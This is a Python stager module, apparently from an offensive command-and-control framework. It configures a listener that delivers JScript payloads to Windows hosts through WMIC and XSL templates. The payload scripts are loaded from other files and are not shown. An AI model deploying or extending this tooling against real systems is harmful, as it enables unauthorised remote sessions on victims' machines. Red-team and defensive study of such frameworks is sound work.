import core.stager
import core.loader

class WMICStager(core.stager.StagerWizard):

    NAME = "JScript WMIC Stager"
    DESCRIPTION = "Listens for new sessions, using WMIC for payloads"
    AUTHORS = [
            'subTee', # discovery
            'mattifestation', #discovery
            'zerosum0x0' # stager
            ]

    WORKLOAD = "js"

    def __init__(self, shell):
        super(WMICStager, self).__init__(shell) # stupid hack inc!
        self.options.set("ENDPOINTTYPE", ".xsl")

    def load(self):
        #self.options.set("SRVPORT", 9998)
        self.port = 9996

        self.stdlib = core.loader.load_script('data/stager/js/stdlib.js')
        self.stage = core.loader.load_script('data/stager/js/stage.js')
        self.stagetemplate = core.loader.load_script("data/stager/js/wmic/template.xsl")
        self.stagecmd = core.loader.load_script("data/stager/js/wmic/wmic.cmd")
        self.forktemplate = self.stagetemplate
        self.forkcmd = self.stagecmd
        self.workload = "js"
